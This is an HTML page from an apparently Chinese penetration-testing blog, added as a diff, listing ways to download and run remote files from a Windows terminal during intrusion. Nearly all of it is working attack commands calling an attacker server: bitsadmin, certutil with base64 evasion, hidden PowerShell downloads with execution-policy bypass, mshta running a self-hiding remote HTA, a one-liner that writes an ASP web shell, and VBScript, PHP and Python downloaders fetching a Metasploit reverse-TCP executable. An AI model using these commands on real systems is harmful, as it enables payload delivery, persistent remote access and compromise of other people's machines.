@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="在 windows 的终端下下载文件，在 windows 的终端下执行远程文件"/>
+  <meta name="author" content="Reber"/>
+  
+    
+      <title>Windows 终端下载文件和执行远程文件 | Reber&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
+  
+    <link rel="stylesheet" href="/css/style.css"/>
+  
+  
+    <script src="/js/jquery-3.6.0.min.js"/></script>
+  
+    <script src="/js/highlight.min.js"/></script>
+  
+    <script src="/js/style.js"/></script>
+  
+  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <header>
+  <div id="brand">
+    <a class="icon-link" href="https://wyb0.com/">
+      <img
+        class="icon"
+        src="/img/logo.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
+      <h3>只会一点点编程、只会一点点渗透</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/friends/"><b>Friends</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+    <div id="content">
+      
+  <main>
+    <article>
+      <h1>Windows 终端下载文件和执行远程文件</h1>
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2018-02-06</time>
+    <span>in</span>
+    
+      <a href="/categories/Pentest">Pentest</a>
+  </strong>
+  <span> • 722 words</span>
+  <span> • 2 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/intranet">intranet</a>
+    </div>
+  
+</div>
+
+      <div>
+
+<p>环境：Windows Server 2008 R2 Enterprise</p>
+
+<h3 id="0x00-bitsadmin下载文件">0x00 bitsadmin下载文件</h3>
+
+<pre><code class="language-bash">bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
+bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip
+bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
+</code></pre>
+
+<h3 id="0x01-certutil下载文件">0x01 certutil下载文件</h3>
+
+<p>保存在当前目录</p>
+
+<pre><code class="language-bash">certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe
+</code></pre>
+
+<p>有时会下载二进制文件的base64编码后的字符串，然后再解码</p>
+
+<pre><code>本地：certutil -encode cc.exe base64.txt
+目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt
+目标：certutil -decode base64.txt cc.exe
+</code></pre>
+
+<p>文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</p>
+
+<pre><code class="language-bash">certutil -urlcache -f http://114.115.123.123/a.exe
+</code></pre>
+
+<h3 id="0x02-powershell下载文件">0x02 powershell下载文件</h3>
+
+<p>有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</p>
+
+<p>C:&gt;powershell set-executionpolicy unrestricted</p>
+
+<pre><code class="language-bash">powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.123.123/a.exe&quot;,&quot;C:\Windows\Temp\a.exe&quot;)
+
+#-w hidden 下载后终端自动退出
+powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.123.123/a.exe&quot;,&quot;C:\Windows\Temp\a.exe&quot;)
+</code></pre>
+
+<h3 id="0x03-mshta下载文件与执行远程文件">0x03 mshta下载文件与执行远程文件</h3>
+
+<p>使用mshta命令的文件都会被缓存到：C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files</p>
+
+<ul>
+<li>执行远程hta文件</li>
+</ul>
+
+<pre><code class="language-bash">mshta http://114.115.123.123/payload.hta
+mshta http://114.115.123.123/a.exe
+#payload.hta和a.exe都会被缓存在IE的缓存目录
+</code></pre>
+
+<p>payload.hta</p>
+
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;script language=&quot;VBScript&quot;&gt;
+        Window.ReSizeTo 0, 0
+        Window.moveTo -2000,-2000
+        Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+        objShell.Run &quot;calc.exe&quot;
+        self.close
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+demo
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<ul>
+<li>写文件的方法</li>
+</ul>
+
+<pre><code>mshta vbscript:createobject(&quot;scripting.filesystemobject&quot;).createtextfile(&quot;a.asp&quot;,2,ture).writeline(&quot;&lt;%execute(request('l'))%&gt;&quot;)(window.close)
+</code></pre>
+
+<h3 id="0x04-visual-basic">0x04 Visual Basic</h3>
+
+<pre><code>Set args = Wscript.Arguments
+Url = &quot;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&quot;
+dim xHttp: Set xHttp = createobject(&quot;Msxml2.ServerXMLHTTP.3.0&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot;C:\Windows\Temp\aa.exe&quot;, 2 '
+end with
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; cscript test.vbs</p>
+
+<h3 id="0x05-利用脚本语言">0x05 利用脚本语言</h3>
+
+<ul>
+<li>PHP</li>
+</ul>
+
+<pre><code>#!/usr/bin/php
+&lt;?php
+    $data = file_get_contents(&quot;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&quot;);
+    file_put_contents('C:\\Windows\\Temp\\aa.exe',$data);
+?&gt;
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; php aa.php</p>
+
+<ul>
+<li>Python</li>
+</ul>
+
+<pre><code>import urllib2;u = urllib2.urlopen('http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
+</code></pre>
+
+<p>C:\Users\Administrator\Desktop&gt; python aa.py</p>
+
+<h3 id="0x06-ftp">0x06 FTP</h3>
+
+<p>远程连接自己的ftp服务器，然后下载文件</p>
+
+<p><br /></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="https://xianzhi.aliyun.com/forum/topic/1654?_blank">https://xianzhi.aliyun.com/forum/topic/1654</a></li>
+<li><a href="https://evi1cg.me/archives/Tricks.html?_blank">https://evi1cg.me/archives/Tricks.html</a></li>
+<li><a href="https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/?_blank">https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/</a></li>
+<li><a href="http://www.secange.com/2017/08/收集整理的16种文件下载的方式/?_blank">http://www.secange.com/2017/08/收集整理的16种文件下载的方式/</a></li>
+</ul>
+</div>
+    </article>
+  </main>
+
+    </div>
+    <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/reber0?_blank">GitHub</a>
+      
+         | 
+        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2015-2022
+    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
+
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
+  </p>
+</footer>
+
+  </body>
+</html>
